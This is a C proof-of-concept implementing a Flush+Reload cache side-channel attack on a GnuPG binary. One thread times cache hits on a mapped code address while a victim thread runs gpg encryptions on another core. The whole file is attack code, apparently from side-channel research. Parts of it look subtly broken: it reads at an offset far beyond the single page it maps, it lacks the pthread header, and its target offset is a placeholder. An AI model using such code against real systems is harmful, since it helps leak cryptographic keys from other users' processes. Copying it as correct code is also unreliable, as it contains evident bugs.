#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>

#define CACHE_HIT_THRESHOLD 80
#define TARGET_OFFSET 0x15000  // Example offset in GnuPG (adjust as needed)

void flush(void *addr) {
    asm volatile("clflush (%0)" : : "r"(addr) : "memory");
}

uint64_t reload(void *addr) {
    unsigned int junk;
    uint64_t time1 = __rdtscp(&junk);
    junk = *(volatile unsigned int *)addr;
    return __rdtscp(&junk) - time1;
}

void *map_gnupg() {
    int fd = open("/home/ev/genkin/flush_reload/gnupg-install/bin/gpg", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return NULL;
    }
    
    void *map = mmap(NULL, sysconf(_SC_PAGESIZE), 
                    PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    return map;
}

void attacker() {
    void *target = map_gnupg();
    if (!target) return;
    
    void *target_addr = target + TARGET_OFFSET;
    
    printf("Monitoring GnuPG at %p\n", target_addr);
    printf("Time\tAccess Time\tCache Hit\n");
    printf("----\t-----------\t---------\n");
    
    for (int i = 0; i < 1000; i++) {
        flush(target_addr);
        usleep(100);
        
        uint64_t time = reload(target_addr);
        printf("%d\t%lu\t%s\n", i, time, time < CACHE_HIT_THRESHOLD ? "HIT" : "MISS");
    }
    
    munmap(target, sysconf(_SC_PAGESIZE));
}

void victim() {
    // Set CPU affinity to different core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    // Use GnuPG to encrypt (simplified - in real attack would call actual gpg)
    printf("Victim: Starting encryption on core 1\n");
    for (int i = 0; i < 5; i++) {
        system("echo 'test message' | /home/ev/genkin/flush_reload/gnupg-install/bin/gpg --encrypt --recipient test@test.com 2>/dev/null");
        usleep(500000);
    }
}

int main() {
    // Run victim on different core
    pthread_t victim_thread;
    pthread_create(&victim_thread, NULL, (void*)victim, NULL);
    
    // Set attacker to core 0
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    printf("Attacker: Monitoring from core 0\n");
    attacker();
    
    pthread_join(victim_thread, NULL);
    return 0;
}
